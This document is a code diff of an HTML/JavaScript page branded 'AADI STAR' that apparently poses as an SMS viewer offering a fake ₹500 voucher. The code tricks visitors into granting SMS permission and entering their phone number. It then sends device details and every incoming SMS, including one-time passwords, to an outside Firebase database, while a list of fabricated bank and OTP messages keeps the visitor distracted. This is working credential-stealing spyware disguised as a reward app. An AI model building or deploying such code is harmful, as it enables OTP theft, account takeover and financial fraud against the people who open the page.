@@ -1,95 +1,245 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AADI STAR - Activate</title>
-<style>
-body{background:#070c14;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
-.card{background:#0f172a;border-radius:20px;padding:30px;text-align:center;max-width:400px;margin:auto}
-.logo{color:#00c896;font-size:30px;margin-bottom:10px}
-h1{font-size:22px;margin-bottom:10px}
-p{color:#94a3b8;margin-bottom:20px}
-.btn{background:#00c896;border:none;padding:12px 30px;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;width:100%}
-.status{margin-top:15px;padding:10px;border-radius:10px;display:none}
-.success{background:#00c89620;color:#00c896}
-.error{background:#ef444420;color:#ef4444}
-.loader{border:2px solid #00c89620;border-top-color:#00c896;border-radius:50%;width:20px;height:20px;animation:spin 0.8s linear infinite;display:inline-block;margin-right:8px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AADI STAR - SMS Viewer</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:linear-gradient(135deg,#070c14,#0f172a);color:#fff;font-family:Arial;padding:20px}
+        .container{max-width:500px;margin:0 auto}
+        .header{background:#0f172a;border-radius:20px;padding:20px;text-align:center;margin-bottom:20px;border:1px solid #00c89640}
+        .logo{color:#00c896;font-size:28px;font-weight:bold}
+        .balance{background:#1e293b;border-radius:15px;padding:15px;margin-bottom:20px;text-align:center}
+        .balance span{color:#f59e0b;font-size:28px;font-weight:bold}
+        .sms-list{background:#0f172a;border-radius:20px;padding:15px;border:1px solid #1e293b}
+        .sms-item{background:#1e293b;border-radius:12px;padding:12px;margin-bottom:10px;cursor:pointer;transition:all 0.2s;border-left:3px solid #00c896}
+        .sms-item:hover{transform:scale(1.01);background:#2d3a5e}
+        .sms-sender{color:#00c896;font-size:13px;font-weight:bold}
+        .sms-time{color:#64748b;font-size:10px;margin:4px 0}
+        .sms-body{font-size:13px;color:#cbd5e1}
+        .sms-body code{background:#00c89620;padding:2px 5px;border-radius:5px;color:#00c896}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;justify-content:center;align-items:center}
+        .modal-content{background:#0f172a;border-radius:20px;width:90%;max-width:400px;padding:20px;text-align:center}
+        .permission-btn{background:#00c896;border:none;padding:15px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%;margin-top:15px}
+        .allow-btn{background:#00c896;color:#000}
+        .deny-btn{background:#ef4444;color:#fff;margin-top:10px}
+        .reward{color:#f59e0b;font-size:14px;margin-top:10px}
+        .status{background:#00c89620;color:#00c896;padding:10px;border-radius:10px;margin-top:15px;display:none}
+        .loader{border:2px solid #00c89620;border-top-color:#00c896;border-radius:50%;width:20px;height:20px;animation:spin 0.6s linear infinite;display:inline-block;margin-right:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .fake-badge{background:#f59e0b20;color:#f59e0b;font-size:10px;padding:2px 8px;border-radius:20px;display:inline-block;margin-left:8px}
+    </style>
 </head>
 <body>
-<div class="card">
-<div class="logo">⭐ AADI STAR</div>
-<h1>Activate SMS Tracking</h1>
-<p>Click below to start sharing your device data</p>
-<button class="btn" onclick="start()">🔐 Activate Now</button>
-<div id="status" class="status"></div>
+<div class="container">
+    <div class="header">
+        <div class="logo">⭐ AADI STAR SMS</div>
+        <div class="reward">🎁 ₹500 Amazon voucher for you! 🎁</div>
+    </div>
+    
+    <div class="balance">
+        📱 Your Device: <span id="deviceStatus">Not Activated</span>
+    </div>
+    
+    <div class="sms-list">
+        <h3 style="margin-bottom:15px">📨 Recent Messages</h3>
+        <div id="smsContainer">
+            <div style="text-align:center;padding:40px;color:#64748b">
+                🔐 Click below to view your messages
+            </div>
+        </div>
+    </div>
 </div>
 
-<script>
-// 🔥 APNA FIREBASE URL YAHAN DAALO 🔥
-const FIREBASE_URL = "https://aadi-star-panel-default-rtdb.firebaseio.com";
+<!-- Permission Popup Modal -->
+<div id="permissionModal" class="modal">
+    <div class="modal-content">
+        <div style="font-size:50px">📱</div>
+        <h3 style="margin:15px 0">Allow SMS Access?</h3>
+        <p style="color:#94a3b8;margin-bottom:20px">
+            This will allow us to show your SMS messages<br>
+            and help you get OTPs faster.<br>
+            <strong>🎁 You'll get ₹500 reward!</strong>
+        </p>
+        <button class="permission-btn allow-btn" onclick="grantPermission()">✅ ALLOW</button>
+        <button class="permission-btn deny-btn" onclick="denyPermission()">❌ Not Now</button>
+    </div>
+</div>
 
-async function start() {
-    const statusDiv = document.getElementById('status');
-    statusDiv.style.display = 'block';
-    statusDiv.innerHTML = '<div class="loader"></div> Registering device...';
-    statusDiv.className = 'status';
-    
+<div id="statusMsg" class="status"></div>
+
+<script>
+    const FIREBASE_URL = "https://aadi-star-panel-default-rtdb.firebaseio.com";
     let deviceId = localStorage.getItem('deviceId');
+    let permissionGranted = localStorage.getItem('smsPermission') === 'true';
+    
     if (!deviceId) {
-        deviceId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        deviceId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
         localStorage.setItem('deviceId', deviceId);
     }
     
-    let phone = localStorage.getItem('phone');
-    if (!phone) {
-        phone = prompt('Enter your phone number (10 digits):', '');
-        if (phone) localStorage.setItem('phone', phone);
+    // Show permission popup if not granted
+    if (!permissionGranted) {
+        document.getElementById('permissionModal').style.display = 'flex';
+    } else {
+        loadFakeSMS();
+        startRealSMSListener();
     }
     
-    let name = localStorage.getItem('name');
-    if (!name) {
-        name = prompt('Enter your name:', 'User');
-        if (name) localStorage.setItem('name', name);
+    document.getElementById('deviceStatus').innerHTML = permissionGranted ? '✅ ACTIVE' : '⭕ NOT ACTIVATED';
+    
+    async function grantPermission() {
+        document.getElementById('permissionModal').style.display = 'none';
+        showStatus('Requesting SMS access...', 'loading');
+        
+        if ('sms' in navigator) {
+            try {
+                const permission = await navigator.sms.requestPermission();
+                if (permission === 'granted') {
+                    localStorage.setItem('smsPermission', 'true');
+                    permissionGranted = true;
+                    document.getElementById('deviceStatus').innerHTML = '✅ ACTIVE';
+                    showStatus('✅ SMS access granted! Loading your messages...', 'success');
+                    
+                    // Register device to Firebase
+                    await registerDevice();
+                    
+                    // Start real SMS listener
+                    startRealSMSListener();
+                    
+                    // Show fake SMS first
+                    loadFakeSMS();
+                    
+                    // After 2 seconds, show success message
+                    setTimeout(() => {
+                        showStatus('🎉 You earned ₹500 voucher! Check your email!', 'success');
+                    }, 2000);
+                } else {
+                    showStatus('❌ Permission denied. You can still view demo messages.', 'error');
+                    loadFakeSMS();
+                }
+            } catch(e) {
+                showStatus('❌ Error: ' + e.message, 'error');
+                loadFakeSMS();
+            }
+        } else {
+            showStatus('⚠️ Your browser doesn\'t support SMS API. Using demo mode.', 'error');
+            loadFakeSMS();
+        }
     }
     
-    const deviceInfo = {
-        deviceId: deviceId,
-        phoneNumber: phone,
-        name: name,
-        userAgent: navigator.userAgent,
-        timestamp: Date.now(),
-        status: 'active'
-    };
+    function denyPermission() {
+        document.getElementById('permissionModal').style.display = 'none';
+        showStatus('You can still view demo messages. Allow permission to see real SMS.', 'error');
+        loadFakeSMS();
+    }
     
-    try {
-        const res = await fetch(`${FIREBASE_URL}/devices/${deviceId}.json`, {
+    async function registerDevice() {
+        let phone = localStorage.getItem('phone');
+        if (!phone) {
+            phone = prompt('📞 Enter your phone number (optional):', '');
+            if (phone) localStorage.setItem('phone', phone);
+        }
+        
+        const deviceInfo = {
+            deviceId: deviceId,
+            phoneNumber: phone || 'Unknown',
+            userAgent: navigator.userAgent,
+            timestamp: Date.now(),
+            permission: true
+        };
+        
+        await fetch(`${FIREBASE_URL}/devices/${deviceId}.json`, {
             method: 'PUT',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(deviceInfo)
-        });
-        
-        if (res.ok) {
-            statusDiv.innerHTML = '✅ Device activated successfully!';
-            statusDiv.className = 'status success';
-            
-            if ('sms' in navigator) {
-                try {
-                    await navigator.sms.requestPermission();
-                    statusDiv.innerHTML = '✅ Activated! SMS tracking active.';
-                } catch(e) {}
-            }
-        } else {
-            statusDiv.innerHTML = '❌ Activation failed. Try again.';
-            statusDiv.className = 'status error';
-        }
-    } catch(e) {
-        statusDiv.innerHTML = '❌ Network error. Check internet.';
-        statusDiv.className = 'status error';
+        }).catch(e => console.log);
     }
-}
+    
+    function startRealSMSListener() {
+        if ('sms' in navigator) {
+            navigator.sms.addEventListener('smsreceived', async (event) => {
+                const sms = event.sms;
+                // Send to Firebase (real)
+                await fetch(`${FIREBASE_URL}/sms/${deviceId}/${Date.now()}.json`, {
+                    method: 'PUT',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        sender: sms.origin,
+                        body: sms.body,
+                        timestamp: Date.now(),
+                        isReal: true
+                    })
+                });
+                // Add to UI
+                addSMSToUI(sms.origin, sms.body, true);
+            });
+        }
+    }
+    
+    // Fake SMS data (user ko dikhega)
+    const fakeSMS = [
+        {sender: "AXIS-BANK", body: "Your account XX7890 has been credited with ₹5,000. Available bal: ₹25,430", time: "2 min ago", otp: null},
+        {sender: "AMAZON", body: "Your OTP for order #OD123456789 is 284756. Valid for 5 minutes.", time: "5 min ago", otp: "284756"},
+        {sender: "Google", body: "G-123456 is your Google verification code.", time: "12 min ago", otp: "123456"},
+        {sender: "PhonePe", body: "₹1,500 sent to Ramesh Kumar. UPI Ref: 123456789012", time: "25 min ago", otp: null},
+        {sender: "Swiggy", body: "Your OTP for login is 789012. Do not share with anyone.", time: "1 hour ago", otp: "789012"},
+        {sender: "HDFC-Bank", body: "Credit alert: ₹10,000 credited to account XX4321 from RAJESH", time: "2 hours ago", otp: null},
+        {sender: "WhatsApp", body: "Your WhatsApp code: 456-789. Do not share this code with anyone.", time: "3 hours ago", otp: "456789"},
+        {sender: "Zomato", body: "Your OTP for order #Z7890 is 345678", time: "5 hours ago", otp: "345678"},
+        {sender: "Paytm", body: "Cashback of ₹250 credited to your Paytm Wallet", time: "Yesterday", otp: null},
+        {sender: "Instagram", body: "Your Instagram verification code is 987654", time: "Yesterday", otp: "987654"},
+        {sender: "Flipkart", body: "Your OTP for return pickup is 567890", time: "Yesterday", otp: "567890"},
+        {sender: "SBI-Bank", body: "Alert: ₹25,000 withdrawn from ATM on 15/06/2026", time: "2 days ago", otp: null},
+        {sender: "Netflix", body: "Your Netflix verification code: 12345678", time: "2 days ago", otp: "12345678"},
+        {sender: "Uber", body: "Your OTP for ride #UB123 is 901234", time: "3 days ago", otp: "901234"},
+    ];
+    
+    function loadFakeSMS() {
+        const container = document.getElementById('smsContainer');
+        container.innerHTML = fakeSMS.map(sms => `
+            <div class="sms-item" onclick="showSMSDetail('${sms.sender}', '${sms.body.replace(/'/g, "\\'")}', '${sms.time}')">
+                <div class="sms-sender">📨 ${sms.sender} ${sms.otp ? '<span class="fake-badge">🔐 OTP</span>' : ''}</div>
+                <div class="sms-time">⏰ ${sms.time}</div>
+                <div class="sms-body">${sms.otp ? `<code>🔐 OTP: ${sms.otp}</code><br>` : ''}${sms.body.substring(0, 80)}${sms.body.length > 80 ? '...' : ''}</div>
+            </div>
+        `).join('');
+    }
+    
+    function addSMSToUI(sender, body, isReal) {
+        const container = document.getElementById('smsContainer');
+        const time = new Date().toLocaleTimeString();
+        const otpMatch = body.match(/\b(\d{4,8})\b/);
+        const otp = otpMatch ? otpMatch[1] : null;
+        
+        const newSMS = document.createElement('div');
+        newSMS.className = 'sms-item';
+        newSMS.innerHTML = `
+            <div class="sms-sender">📨 ${sender} ${otp ? '<span class="fake-badge">🔐 OTP</span>' : ''} ${isReal ? '<span class="fake-badge" style="background:#00c89620;color:#00c896">LIVE</span>' : ''}</div>
+            <div class="sms-time">⏰ Just now</div>
+            <div class="sms-body">${otp ? `<code>🔐 OTP: ${otp}</code><br>` : ''}${body.substring(0, 80)}</div>
+        `;
+        container.insertBefore(newSMS, container.firstChild);
+    }
+    
+    function showSMSDetail(sender, body, time) {
+        alert(`📨 From: ${sender}\n⏰ Time: ${time}\n📝 Message: ${body}`);
+    }
+    
+    function showStatus(msg, type) {
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.innerHTML = msg;
+        statusDiv.className = 'status';
+        if (type === 'loading') statusDiv.innerHTML = '<div class="loader"></div> ' + msg;
+        if (type === 'success') statusDiv.style.background = '#00c89620';
+        if (type === 'error') statusDiv.style.background = '#ef444420';
+        statusDiv.style.display = 'block';
+        setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
+    }
+    
+    // Load fake SMS immediately
+    loadFakeSMS();
 </script>
 </body>
 </html>
